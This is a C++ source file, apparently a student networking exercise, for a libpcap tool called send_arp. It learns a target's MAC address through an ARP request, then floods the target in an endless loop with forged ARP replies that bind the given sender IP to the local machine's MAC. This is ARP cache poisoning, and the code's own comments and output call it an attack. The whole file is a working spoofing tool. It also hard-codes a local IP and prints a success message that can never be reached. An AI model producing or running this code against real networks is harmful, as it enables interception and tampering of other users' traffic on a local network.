#include <iostream>
#include <cstring> //for memset
#include <pcap.h>
#include <mypcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

#define TYPE_IP 0x0800
#define TYPE_ARP 0x0806

void usage(){
    cout<<"syntax: send_arp <interface> <sender ip> <target ip>"<<endl;
    cout<<"sample: send_arp wlan0 192.168.10.2 192.168.10.1"<<endl;
}

int main(int argc, char* argv[])
{
    if(argc != 4){
        usage();
        return -1;
    }
    unsigned char packet[1500];
    unsigned char mymac[6];//by get_mymac
    unsigned char myip[4] = {10,1,1,97};
    unsigned char broadcast_addr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    unsigned char targetip[4];
    unsigned char targetmac[6];//by receive response
    unsigned char senderip[4];
    //unsigned char sendermac[6]; - useless
    get_mymac(mymac);
    memset(packet, 0, sizeof(packet));
    myether eth;
    myarp arp;
    int len =0 ;

    //split argv
    char *token;
    int cnt=0;
    token = strtok(argv[2],".");
    while(token){
        senderip[cnt] = atoi(&token[0]);
        token = strtok(NULL, ".");
        cnt++;
    }
    cnt =0;
    token = strtok(argv[3], ".");
    while(token){
        targetip[cnt] = atoi(&token[0]);
        token = strtok(NULL, ".");
        cnt++;
    }

    /************make request packet****************/
    //insert ethernet data
    make_eth(&eth, mymac, broadcast_addr);
    memcpy(packet, &eth , sizeof (eth));
    len += sizeof(eth);

    //insert arp data
    make_arp(&arp,1,mymac, myip, broadcast_addr,targetip );
    memcpy(packet+len, &arp, sizeof(arp));
    len += sizeof(arp);

    //open the out device
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    //send packet
    if(pcap_sendpacket(handle,packet,len)!=0){
        printf("send packt error!\n");
        return -2;
    }

    /******************receive response packet*************/
    //receive packet
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* r_packet;

        int res = pcap_next_ex(handle, &header, &r_packet);
        if(receive_arp(r_packet,targetmac, mymac)==1) break;
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        //printf("%u bytes captured\n", header->caplen);
        //printf("\n");
    }




    /*************make attack packet*****************/
    while(1){
        unsigned char packet2[1500];
        myether eth2;
        myarp arp2;
        int len2 =0 ;
        //insert ethernet data
        make_eth(&eth2, mymac,targetmac);
        memcpy(packet2, &eth2 , sizeof (eth2));
        len2 += sizeof(eth2);

        //insert arp data
        make_arp(&arp2,2,mymac, senderip, targetmac, targetip );
        memcpy(packet2+len2, &arp2, sizeof(arp2));
        len2 += sizeof(arp2);

        //open the out device
        /* char* dev2 = argv[1];
        char errbuf2[PCAP_ERRBUF_SIZE];
        pcap_t* handle2 = pcap_open_live(dev2, BUFSIZ, 1, 1000, errbuf2);
        if (handle2 == NULL) {
            fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf2);
            return -1;
        }*/

        //send packet
        if(pcap_sendpacket(handle,packet2,len2)!=0){
            printf("send packt error!\n");
            return -2;
        }
    }

    cout << "ARP Spooping SUCCESS!" << endl;
    return 0;
}
